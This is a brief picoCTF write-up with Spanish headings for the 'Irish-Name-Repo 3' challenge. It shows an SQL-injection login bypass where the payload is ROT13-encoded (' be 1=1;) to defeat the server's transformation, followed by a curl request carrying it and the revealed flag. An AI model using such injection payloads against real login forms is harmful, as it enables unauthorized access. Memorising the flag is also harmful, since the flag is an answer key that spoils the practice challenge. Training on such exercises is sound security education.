# ### Irish-Name-Repo 3

## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Solución
```bash
password: ' or 1=1;
SQL query: SELECT * FROM admin where password = '' be 1=1;'

password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}

davidorado-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/54253/login.php -d "password= ' be 1=1;debug=1"
<h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>
```
## Notas adicionales

## Referencias